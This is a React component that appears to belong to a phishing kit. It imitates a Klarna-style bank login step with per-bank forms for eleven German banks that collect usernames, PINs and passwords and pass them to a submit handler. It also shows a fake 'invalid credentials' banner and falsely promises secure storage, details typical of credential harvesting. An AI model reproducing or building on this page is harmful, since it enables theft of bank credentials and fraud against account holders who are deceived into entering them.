import React, { useState } from 'react';
import { Lock } from 'lucide-react';

interface KlarnaBankLoginProps {
  selectedBank: string | null;
  onSubmit: (data: any) => void;
  showError?: boolean;
}

// Bank-specific login configurations
const BANK_LOGIN_CONFIGS: Record<string, any> = {
  commerzbank: {
    fields: [
      { name: 'username', type: 'text', label: 'Benutzername', placeholder: 'Ihr Benutzername', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  sparkasse: {
    fields: [
      { name: 'username', type: 'text', label: 'Anmeldename', placeholder: 'Ihr Anmeldename', required: true },
      { name: 'pin', type: 'password', label: 'PIN', placeholder: 'Ihre PIN', required: true }
    ]
  },
  dkb: {
    fields: [
      { name: 'username', type: 'text', label: 'Anmeldename', placeholder: 'Ihr Anmeldename', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  volksbank: {
    fields: [
      { name: 'username', type: 'text', label: 'VR-NetKey', placeholder: 'Ihr VR-NetKey', required: true },
      { name: 'pin', type: 'password', label: 'PIN', placeholder: 'Ihre PIN', required: true }
    ]
  },
  postbank: {
    fields: [
      { name: 'username', type: 'text', label: 'Postbank ID', placeholder: 'Ihre Postbank ID', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  santander: {
    fields: [
      { name: 'username', type: 'text', label: 'Benutzername', placeholder: 'Ihr Benutzername', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  apobank: {
    fields: [
      { name: 'username', type: 'text', label: 'Benutzername', placeholder: 'Ihr Benutzername', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  comdirect: {
    fields: [
      { name: 'username', type: 'text', label: 'Zugangsnummer', placeholder: 'Ihre Zugangsnummer', required: true },
      { name: 'pin', type: 'password', label: 'PIN', placeholder: 'Ihre PIN', required: true }
    ]
  },
  consorsbank: {
    fields: [
      { name: 'username', type: 'text', label: 'Anmeldename', placeholder: 'Ihr Anmeldename', required: true },
      { name: 'password', type: 'password', label: 'Passwort', placeholder: 'Ihr Passwort', required: true }
    ]
  },
  ingdiba: {
    fields: [
      { name: 'username', type: 'text', label: 'Zugangsnummer', placeholder: 'Ihre Zugangsnummer', required: true },
      { name: 'password', type: 'password', label: 'Internetbanking PIN', placeholder: 'Ihre PIN', required: true }
    ]
  },
  deutsche_bank: {
    fields: [
      { name: 'branch', type: 'text', label: 'Filiale', placeholder: 'Filiale (3-stellig)', required: true, maxLength: 3 },
      { name: 'account', type: 'text', label: 'Konto-/Depotnummer', placeholder: 'Ihre Kontonummer', required: true },
      { name: 'pin', type: 'password', label: 'PIN', placeholder: 'Ihre PIN', required: true }
    ]
  }
};

// Bank display names and logos
const BANK_INFO: Record<string, { displayName: string; logo: string }> = {
  commerzbank: { displayName: 'Commerzbank', logo: '/templates/klarna/images/bank-icons/commerzbank.svg' },
  sparkasse: { displayName: 'Sparkasse', logo: '/templates/klarna/images/bank-icons/sparkasse.svg' },
  dkb: { displayName: 'DKB', logo: '/templates/klarna/images/bank-icons/dkb.svg' },
  volksbank: { displayName: 'Volksbank', logo: '/templates/klarna/images/bank-icons/volksbank.svg' },
  postbank: { displayName: 'Postbank', logo: '/templates/klarna/images/bank-icons/postbank.svg' },
  santander: { displayName: 'Santander', logo: '/templates/klarna/images/bank-icons/santander.svg' },
  apobank: { displayName: 'Apobank', logo: '/templates/klarna/images/bank-icons/apobank.svg' },
  comdirect: { displayName: 'comdirect', logo: '/templates/klarna/images/bank-icons/comdirect.svg' },
  consorsbank: { displayName: 'Consorsbank', logo: '/templates/klarna/images/bank-icons/consorsbank.svg' },
  ingdiba: { displayName: 'ING', logo: '/templates/klarna/images/bank-icons/ingdiba.svg' },
  deutsche_bank: { displayName: 'Deutsche Bank', logo: '/templates/klarna/images/bank-icons/deutsche_bank.svg' }
};

const KlarnaBankLogin: React.FC<KlarnaBankLoginProps> = ({ selectedBank, onSubmit, showError = false }) => {
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);

  if (!selectedBank) {
    return (
      <div className="klarna-error-container">
        <p>Keine Bank ausgewählt</p>
      </div>
    );
  }

  const bankConfig = BANK_LOGIN_CONFIGS[selectedBank];
  const bankInfo = BANK_INFO[selectedBank];

  if (!bankConfig || !bankInfo) {
    return (
      <div className="klarna-error-container">
        <p>Bank-Konfiguration nicht gefunden</p>
      </div>
    );
  }

  const handleInputChange = (name: string, value: string) => {
    setFormData(prev => ({ ...prev, [name]: value }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};

    bankConfig.fields.forEach((field: any) => {
      if (field.required && !formData[field.name]?.trim()) {
        newErrors[field.name] = `${field.label} ist erforderlich`;
      }
      
      // Special validation for Deutsche Bank
      if (selectedBank === 'deutsche_bank' && field.name === 'branch') {
        const branch = formData[field.name]?.trim();
        if (branch && (branch.length !== 3 || !/^\d{3}$/.test(branch))) {
          newErrors[field.name] = 'Filiale muss 3-stellig sein';
        }
      }
    });

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    
    try {
      await onSubmit(formData);
    } catch (error) {
      console.error('Login submission error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="klarna-bank-login">
      <div className="klarna-bank-login-header">
        <div className="klarna-bank-logo-large">
          <img 
            src={bankInfo.logo} 
            alt={bankInfo.displayName}
            onError={(e) => {
              (e.target as HTMLImageElement).src = '/templates/klarna/images/bank-icons/generic-bank.svg';
            }}
          />
        </div>
        <h1 className="klarna-title">
          Anmeldung bei {bankInfo.displayName}
        </h1>
        <p className="klarna-subtitle">
          Melden Sie sich sicher mit Ihren gewohnten Zugangsdaten an
        </p>
      </div>

      {showError && (
        <div className="klarna-error-message">
          <div className="klarna-error-icon">
            <svg fill="#d32f2f" width="24px" height="24px" focusable="false" role="" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
              <path d="M11 9v4h2V8h-2v1z"></path>
              <path d="m23 18.1-9.12-16a2.15 2.15 0 0 0-3.74 0L1 18.1A1.94 1.94 0 0 0 2.7 21h18.6a1.94 1.94 0 0 0 1.7-2.9ZM2.8 19l9.07-15.92a.15.15 0 0 1 .26 0L21.2 19Z"></path>
              <circle cx="12" cy="16.5" r="1.5"></circle>
            </svg>
          </div>
          <p className="klarna-error-text">
            Die eingegebenen Anmeldedaten sind ungültig. Bitte versuchen Sie es erneut.
          </p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="klarna-login-form">
        {bankConfig.fields.map((field: any) => (
          <div key={field.name} className="klarna-form-group">
            <label htmlFor={field.name} className="klarna-label">
              {field.label}
              {field.required && <span className="klarna-required">*</span>}
            </label>
            
            <input
              type={field.type}
              id={field.name}
              name={field.name}
              placeholder={field.placeholder}
              value={formData[field.name] || ''}
              onChange={(e) => handleInputChange(field.name, e.target.value)}
              className={`klarna-input ${errors[field.name] ? 'klarna-input-error' : ''}`}
              maxLength={field.maxLength}
              required={field.required}
              disabled={isLoading}
            />
            
            {errors[field.name] && (
              <span className="klarna-error-text">{errors[field.name]}</span>
            )}
          </div>
        ))}

        <div className="klarna-login-actions">
          <button 
            type="submit" 
            className="klarna-button klarna-button-primary klarna-button-full"
            disabled={isLoading}
          >
            {isLoading ? 'Wird angemeldet...' : 'Anmelden'}
          </button>
        </div>
      </form>

      <div className="klarna-login-footer">
        <div className="klarna-security-notice">
          <Lock size={20} className="klarna-security-icon" />
          <p className="klarna-security-text">
            Ihre Anmeldedaten werden verschlüsselt übertragen und sicher gespeichert
          </p>
        </div>
        
        <div className="klarna-help-links">
          <a href="#" className="klarna-link">Zugangsdaten vergessen?</a>
          <a href="#" className="klarna-link">Hilfe bei der Anmeldung</a>
        </div>
      </div>
    </div>
  );
};

export default KlarnaBankLogin;
